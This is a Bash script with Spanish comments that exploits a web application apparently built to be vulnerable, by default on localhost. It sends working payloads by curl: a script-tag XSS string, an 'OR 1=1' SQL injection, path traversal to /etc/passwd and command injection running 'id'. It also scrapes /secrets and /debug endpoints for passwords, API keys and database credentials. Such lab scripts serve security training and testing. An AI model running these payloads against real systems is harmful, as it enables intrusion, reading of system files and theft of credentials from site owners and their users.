#!/bin/bash

# Script para explotar vulnerabilidades en vulnerable-web-app

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ -z "$1" ]; then
    echo -e "${RED}Uso: $0 <URL_BASE>${NC}"
    echo "Ejemplo: $0 http://localhost:3000"
    exit 1
fi

BASE_URL="$1"

echo -e "${BLUE}=== Explotando Vulnerabilidades en Web App ===${NC}\n"

# 1. XSS (Cross-Site Scripting)
echo -e "${YELLOW}[1] Probando XSS en /search${NC}"
curl -s "${BASE_URL}/search?q=<script>alert('XSS')</script>" | grep -i "script" && \
    echo -e "${GREEN}✓ XSS vulnerable${NC}" || \
    echo -e "${RED}✗ XSS no explotable${NC}"

# 2. SQL Injection
echo -e "\n${YELLOW}[2] Probando SQL Injection en /users${NC}"
curl -s "${BASE_URL}/users?id=1 OR 1=1" | grep -i "executing" && \
    echo -e "${GREEN}✓ SQL Injection vulnerable${NC}" || \
    echo -e "${RED}✗ SQL Injection no explotable${NC}"

# 3. Path Traversal
echo -e "\n${YELLOW}[3] Probando Path Traversal en /file${NC}"
curl -s "${BASE_URL}/file?name=../../../etc/passwd" | grep -i "root:" && \
    echo -e "${GREEN}✓ Path Traversal vulnerable${NC}" || \
    echo -e "${RED}✗ Path Traversal no explotable${NC}"

# 4. Command Injection
echo -e "\n${YELLOW}[4] Probando Command Injection en /execute${NC}"
RESPONSE=$(curl -s -X POST "${BASE_URL}/execute" \
    -H "Content-Type: application/json" \
    -d '{"command":"id"}')
echo "$RESPONSE" | grep -i "uid" && \
    echo -e "${GREEN}✓ Command Injection vulnerable${NC}" || \
    echo -e "${RED}✗ Command Injection no explotable${NC}"

# 5. Exposición de Secretos
echo -e "\n${YELLOW}[5] Probando exposición de secretos en /secrets${NC}"
curl -s "${BASE_URL}/secrets" | grep -i "password\|secret\|key" && \
    echo -e "${GREEN}✓ Secretos expuestos${NC}" || \
    echo -e "${RED}✗ No se encontraron secretos${NC}"

# 6. Información de Debug
echo -e "\n${YELLOW}[6] Probando exposición de información en /debug${NC}"
curl -s "${BASE_URL}/debug" | jq '.' 2>/dev/null || curl -s "${BASE_URL}/debug"
echo -e "\n${GREEN}✓ Información de debug expuesta${NC}"

# 7. Enumerar variables de entorno
echo -e "\n${YELLOW}[7] Intentando leer variables de entorno${NC}"
curl -s "${BASE_URL}/debug" | grep -i "DB_PASSWORD\|API_KEY\|SECRET" && \
    echo -e "${GREEN}✓ Variables de entorno expuestas${NC}" || \
    echo -e "${RED}✗ No se encontraron variables${NC}"

echo -e "\n${BLUE}=== Explotación Completada ===${NC}"

